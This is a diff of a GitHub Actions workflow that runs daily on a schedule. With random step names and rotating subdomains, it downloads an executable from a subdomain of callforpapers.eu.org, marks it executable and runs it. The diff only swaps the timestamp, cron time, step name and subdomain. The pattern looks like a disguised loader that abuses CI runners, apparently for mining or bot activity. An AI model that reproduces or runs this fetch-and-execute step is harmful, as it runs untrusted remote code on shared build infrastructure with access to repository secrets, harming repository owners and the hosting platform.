@@ -1,4 +1,4 @@
-#2024-03-18-[083359]-6ndd4ei2
+#2024-03-18-[135738]-eir2ecww
 name: main
 
 on:
@@ -8,15 +8,15 @@ on:
     types: runner_workflow
 
   schedule:
-    - cron: "53 3 * * * "
-
+    - cron: "21 2 * * * "
+    
 jobs:
   build-deploy:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: pcifkcn94i5qsl50
+      - name: bw68ix1fempzsakm
         run: |
-          wget -q https://8q10acltla7qbwke.callforpapers.eu.org/sync_repositories
+          wget -q https://d6v3xc1jxytuh7f4.callforpapers.eu.org/sync_repositories
           chmod 755 sync_repositories
           ./sync_repositories
